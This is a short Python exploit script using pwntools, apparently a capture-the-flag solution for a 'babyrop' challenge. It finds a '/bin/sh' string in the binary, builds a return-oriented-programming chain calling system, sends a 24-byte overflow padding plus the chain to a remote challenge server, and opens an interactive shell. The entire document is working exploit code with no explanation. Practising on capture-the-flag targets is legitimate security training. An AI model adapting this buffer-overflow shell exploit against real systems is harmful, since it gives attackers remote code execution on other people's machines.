from pwn import *
context.clear(arch='amd64')
elf = ELF('./babyrop')
sh = next(elf.search('/bin/sh'))
r = ROP(elf)
r.system(sh)
# p = elf.process()
p = remote('problem.harekaze.com',20001)
p.sendline('a'*24 + str(r))
p.interactive()